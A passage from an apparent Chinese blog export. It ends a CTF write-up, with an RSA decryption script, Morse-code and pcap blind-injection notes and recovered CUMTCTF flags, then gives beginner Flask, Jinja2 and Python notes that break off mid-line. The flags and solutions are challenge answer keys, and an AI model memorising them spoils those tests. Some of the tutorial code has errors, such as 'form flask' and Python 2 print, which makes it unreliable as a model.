Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">e=<span class=\"number\">0x10001</span></span><br><span class=\"line\">c = <span class=\"number\">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class=\"line\">p = <span class=\"number\">324350545929838254331191385863847627003</span></span><br><span class=\"line\">q = <span class=\"number\">328413456989577256301798468872388310877</span></span><br><span class=\"line\">n = <span class=\"number\">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class=\"line\">d = gmpy2.invert(e,(p<span class=\"number\">-1</span>)*(q<span class=\"number\">-1</span>))</span><br><span class=\"line\">m = pow(c,d,n)</span><br><span class=\"line\">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>\n<p>可以看见flag</p>\n<h2 id=\"小学生的密码题\"><a href=\"#小学生的密码题\" class=\"headerlink\" title=\"小学生的密码题\"></a>小学生的密码题</h2><p>这个很明显就可以看出规律就是一般都是以8开头</p>\n<p>然后我有点懒（说实话是不太会写）就一个一个拼接出flag</p>\n<h1 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h1><h2 id=\"真·签到题\"><a href=\"#真·签到题\" class=\"headerlink\" title=\"真·签到题\"></a>真·签到题</h2><p>zip伪加密然后base64解密拿flag</p>\n<h2 id=\"别做题了听歌吧\"><a href=\"#别做题了听歌吧\" class=\"headerlink\" title=\"别做题了听歌吧\"></a>别做题了听歌吧</h2><p>mp3隐写</p>\n<p>这个题可以  cumt是密码</p>\n<p>然后是mose编码我真是一个一个拼的，应该拿python脚本写比较好，毕竟pytho学得不太好</p>\n<p>应该是这个，拼错了好几回</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"大鲨鱼之你可劲找\"><a href=\"#大鲨鱼之你可劲找\" class=\"headerlink\" title=\"大鲨鱼之你可劲找\"></a>大鲨鱼之你可劲找</h2><p>流量包分析，直接跟tcp流可以看见一个盲注的传输内容</p>\n<p>是二分法</p>\n<p>然后我就又又又自己拼写</p>\n<p>拼错了好几回</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;</span><br></pre></td></tr></table></figure>\n","categories":["CTF"],"tags":["WP"]},{"title":"python开发","url":"https://pz1o.top/2020/08/13/python开发/","content":"<a id=\"more\"></a>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>顺便复习一下python，主要是掌握一下python的主流框架（Flask和Django ）</p>\n<h1 id=\"Flask\"><a href=\"#Flask\" class=\"headerlink\" title=\"Flask\"></a>Flask</h1><h2 id=\"URL和视图\"><a href=\"#URL和视图\" class=\"headerlink\" title=\"URL和视图\"></a>URL和视图</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 从flask这个框架中导入Flask这个类</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化一个Flask对象</span></span><br><span class=\"line\"><span class=\"comment\"># Flask()</span></span><br><span class=\"line\"><span class=\"comment\"># 需要传递一个参数__name__</span></span><br><span class=\"line\"><span class=\"comment\"># 1. 方便flask框架去寻找资源</span></span><br><span class=\"line\"><span class=\"comment\"># 2. 方便flask插件比如Flask-Sqlalchemy出现错误的时候，好去寻找问题所在的位置</span></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># @app.route是一个装饰器</span></span><br><span class=\"line\"><span class=\"comment\"># @开头，并且在函数的上面，说明是装饰器</span></span><br><span class=\"line\"><span class=\"comment\"># 这个装饰器的作用，是做一个url与视图函数的映射</span></span><br><span class=\"line\"><span class=\"comment\"># 127.0.0.1:5000/   -&gt;  去请求hello_world这个函数，然后将结果返回给浏览器</span></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello_world</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'我是第一个flask程序'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果当前这个文件是作为入口程序运行，那么就执行app.run()</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">        <span class=\"comment\"># app.run()</span></span><br><span class=\"line\">        <span class=\"comment\"># 启动一个应用服务器，来接受用户的请求</span></span><br><span class=\"line\">        <span class=\"comment\"># while True:</span></span><br><span class=\"line\">        <span class=\"comment\">#  listen()</span></span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<h3 id=\"设置debug模式\"><a href=\"#设置debug模式\" class=\"headerlink\" title=\"设置debug模式\"></a><strong>设置debug模式</strong></h3><ol>\n<li>在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式。</li>\n<li>debug模式的两大功能：<ul>\n<li>当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。</li>\n<li>只要修改了项目中的<code>python</code>文件，程序会自动加载，不需要手动重新启动服务器。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"使用配置文件\"><a href=\"#使用配置文件\" class=\"headerlink\" title=\"使用配置文件\"></a><strong>使用配置文件</strong></h3><ol>\n<li>新建一个<code>config.py</code>文件</li>\n<li>在主app文件中导入这个文件，并且配置到<code>app</code>中，示例代码如下： <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import config</span><br><span class=\"line\">app.config.from_object(config)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"URL传参到视图\"><a href=\"#URL传参到视图\" class=\"headerlink\" title=\"URL传参到视图\"></a><strong>URL传参到视图</strong></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)</span><br><span class=\"line\">def users(id):</span><br><span class=\"line\">    return u&#39;您请求的参数是：&#123;&#125;&#39;.format(id)</span><br><span class=\"line\">#参数需要放在两个尖括号中。</span><br><span class=\"line\">#视图函数中需要放和url中的参数同名的参数。</span><br></pre></td></tr></table></figure>\n<h3 id=\"反转URL\"><a href=\"#反转URL\" class=\"headerlink\" title=\"反转URL\"></a><strong>反转URL</strong></h3><ol>\n<li>什么叫做反转URL：从视图函数到url的转换叫做反转url</li>\n<li>反转url的用处：<ul>\n<li>在页面重定向的时候，会使用url反转。</li>\n<li>在模板中，也会使用url反转。</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask,url_for</span><br><span class=\"line\">print url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;)</span><br></pre></td></tr></table></figure>\n<p><strong>页面跳转和重定向</strong></p>\n<p> 用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让重定向到登录页面。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">form flask <span class=\"keyword\">import</span> redirect,url_for</span><br><span class=\"line\">url = url_for(<span class=\"string\">'users'</span>)  users是视图函数</span><br><span class=\"line\">redirect(url)</span><br></pre></td></tr></table></figure>\n<h2 id=\"jinja2模板\"><a href=\"#jinja2模板\" class=\"headerlink\" title=\"jinja2模板\"></a>jinja2模板</h2><h3 id=\"模板渲染和参数\"><a href=\"#模板渲染和参数\" class=\"headerlink\" title=\"模板渲染和参数\"></a>模板渲染和参数</h3><p>1.如何渲染模板：</p>\n<ul>\n<li>模板放在<code>templates</code>文件夹下</li>\n<li>从<code>flask</code>中导入<code>render_template</code>函数。</li>\n<li>在视图函数中，使用<code>render_template</code>函数，渲染模板。注意：只需要填写模板的名字，不需要填写<code>templates</code>这个文件夹的路径。</li>\n</ul>\n<p>2.模板传参：</p>\n<ul>\n<li>如果只有一个或者少量参数，直接在<code>render_template</code>函数中添加关键字参数就可以了。</li>\n<li>如果有多个参数的时候，那么可以先把所有的参数放在<strong>字典</strong>中，然后在<code>render_template</code>中，<br><strong>使用两个星号，把字典转换成关键参数传递进去，这样的代码更方便管理和使用。</strong></li>\n</ul>\n<p>3.在模板中，如果要使用一个变量，语法是：<code></code></p>\n<p>4.访问模型中的属性或者是字典，可以通过<code></code>的形式，或者是使用<code></code>.</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">        name = <span class=\"string\">'pz1o'</span></span><br><span class=\"line\">        age = <span class=\"number\">18</span></span><br><span class=\"line\">    p = Person()</span><br><span class=\"line\">    <span class=\"comment\">#login_url = url_for('users')</span></span><br><span class=\"line\">    <span class=\"comment\">#return redirect(login_url)</span></span><br><span class=\"line\">    context = &#123;</span><br><span class=\"line\">        <span class=\"string\">'gender'</span>:<span class=\"string\">'nan'</span>,</span><br><span class=\"line\">        <span class=\"string\">'person'</span>: p</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,**context)</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"if和for\"><a href=\"#if和for\" class=\"headerlink\" title=\"if和for\"></a>if和for</h3><p><strong>if</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">if</span> xxx %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">else</span> %&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> user%&#125;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;注销&lt;/a&gt;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">else</span> %&#125;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;登录&lt;/a&gt;</span><br><span class=\"line\">        &lt;a href=\"#\"&gt;注册&lt;/a&gt;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,user=user)</span><br></pre></td></tr></table></figure>\n<p><strong>for</strong></p>\n<p>  字典的遍历，语法和<code>python</code>一样，可以使用<code>items()</code>、<code>keys()</code>、<code>values()</code>、<code>iteritems()</code>、<code>iterkeys()</code>、<code>itervalues()</code></p>\n   <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> k,v <span class=\"keyword\">in</span> user.items() %&#125;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; k &#125;&#125;：&#123;&#123; v &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>   列表的遍历：语法和<code>python</code>一样。</p>\n   <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> website <span class=\"keyword\">in</span> websites %&#125;</span><br><span class=\"line\">    &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"过滤器\"><a href=\"#过滤器\" class=\"headerlink\" title=\"过滤器\"></a>过滤器</h3><p><img src=\"/2020/08/13/python%E5%BC%80%E5%8F%91/image-20200814161938542.png\" alt=\"image-20200814161938542\"></p>\n<p>介绍和语法：</p>\n<ul>\n<li><p>介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来。作用的对象是变量。</p>\n</li>\n<li><p>语法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;avatar|default()&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>default过滤器：如果当前变量不存在，这时候可以指定默认值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#修改默认图片</span></span><br><span class=\"line\">avatar = <span class=\"string\">'xxx'</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,avatar=avatar)</span><br><span class=\"line\">&lt;img src=<span class=\"string\">'&#123;&#123;avatar|default('</span>...<span class=\"string\">')&#125;&#125;'</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>length过滤器：求列表或者字符串或者字典或者元组的长度。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#统计评论条数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">comment = [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">'user'</span>:<span class=\"string\">'pz1o'</span>,</span><br><span class=\"line\">            <span class=\"string\">'content'</span>:<span class=\"string\">'xxx'</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">'user'</span>:<span class=\"string\">'lzy'</span>,</span><br><span class=\"line\">            <span class=\"string\">'content'</span>:<span class=\"string\">'xxxx'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>,comments=comment)</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;p&gt;评论数:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt;</span><br><span class=\"line\">    &lt;ul&gt;</span><br><span class=\"line\">        &#123;% <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> comments %&#125;</span><br><span class=\"line\">        &lt;li&gt;</span><br><span class=\"line\">            &lt;a href=\"#\"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt;</span><br><span class=\"line\">        &lt;/li&gt;</span><br><span class=\"line\">            &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt;</span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">    &lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"继承和block\"><a href=\"#继承和block\" class=\"headerlink\" title=\"继承和block\"></a>继承和block</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python中的继承</span><br><span class=\"line\">class Person(object):</span><br><span class=\"line\">\tname &#x3D; &#39;pz1o&#39;</span><br><span class=\"line\">\tage &#x3D; 18</span><br><span class=\"line\">class Student(Person):</span><br><span class=\"line\">\tpass</span><br></pre></td></tr></table></figure>\n<p>继承作用和语法：</p>\n<ul>\n<li><p>作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码。</p>\n</li>\n<li><p>语法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% extends &#39;base.html&#39;%&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>block实现：</p>\n<ul>\n<li>作用：可以让子模板实现一些自己的需求。父模板需要提前定义好。</li>\n<li>注意点：子模板中的代码，必须放在block块中。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% block main %&#125;</span><br><span class=\"line\">    &lt;h1&gt;这是首页&lt;&#x2F;h1&gt;</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"python开发\"><a href=\"#python开发\" class=\"headerlink\" title=\"python开发\"></a>python开发</h1><h2 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\">print(<span class=\"string\">'hello pz1o'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#linux下执行</span></span><br><span class=\"line\">chmod <span class=\"number\">777</span> python</span><br><span class=\"line\">./a.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#优化生成pyo</span></span><br><span class=\"line\">python -O -m py_compile a.py</span><br><span class=\"line\">python a.pyo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#eval</span></span><br><span class=\"line\">a = <span class=\"string\">'[1,2,3]'</span></span><br><span class=\"line\">b = eval(a)</span><br><span class=\"line\">print(b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#%格式化字符串</span></span><br><span class=\"line\"><span class=\"comment\">#%c:ascii</span></span><br><span class=\"line\">a = <span class=\"number\">97</span></span><br><span class=\"line\">print(<span class=\"string\">'i am %c'</span>%a)</span><br><span class=\"line\"><span class=\"comment\">#%x:16进制</span></span><br><span class=\"line\">print(<span class=\"string\">'i am %x'</span>%a)</span><br><span class=\"line\"><span class=\"comment\">#%o:8进制</span></span><br><span class=\"line\">print(<span class=\"string\">'i am %o'</span>%a)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#日期</span></span><br><span class=\"line\">time = time.time()</span><br><span class=\"line\">time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#args处理多余参数 args处理列表和元组 kwargs处理字典</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sub</span><span class=\"params\">(num1,num2,*args,**kwargs)</span>:</span></span><br><span class=\"line\">  print(num1-num2)</span><br><span class=\"line\">  print(args)</span><br><span class=\"line\">  print(kwargs)</span><br><span class=\"line\">a = [<span class=\"number\">5</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\">sub(*a)</span><br><span class=\"line\"><span class=\"number\">2</span>  (<span class=\"number\">2</span>,)  &#123;&#125;</span><br><span class=\"line\">sub(<span class=\"number\">5</span>,<span class=\"number\">3</span>,x=<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"number\">2</span>  ()  &#123;<span class=\"string\">'x'</span>: <span class=\"number\">2</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#文件操作</span></span><br><span class=\"line\"><span class=\"comment\">#r只读  </span></span><br><span class=\"line\"><span class=\"comment\">#w写入  删除原文件，重新写入，无则创建</span></span><br><span class=\"line\"><span class=\"comment\">#a写入 文件末尾追加新的内容，无则创建</span></span><br><span class=\"line\"><span class=\"comment\">#a+读写  文件末尾追加新的内容，无则创建</span></span><br><span class=\"line\"><span class=\"comment\">#b 打开二进制文件</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'yyds.txt'</span>,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    print(f.read())</span><br><span class=\"line\">CUMTCTF&#123;<span class=\"number\">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class=\"line\">\t\tf.seek(<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">  \tprint(f.read())</span><br><span class=\"line\">&#123;<span class=\"number\">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class=\"line\"><span class=\"comment\">#f.seek('偏移量','选项')</span></span><br><span class=\"line\"><span class=\"comment\">#选项为0时，从文件头部向后偏移</span></span><br><span class=\"line\"><span class=\"comment\">#选项为1时，从当前位置偏移</span></span><br><span class=\"line\"><span class=\"comment\">#选项为2时，从文件末向前偏移</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#os模块</span></span><br><span class=\"line\">os.mkdir(<span class=\"string\">'./yyds'</span>)</span><br><span 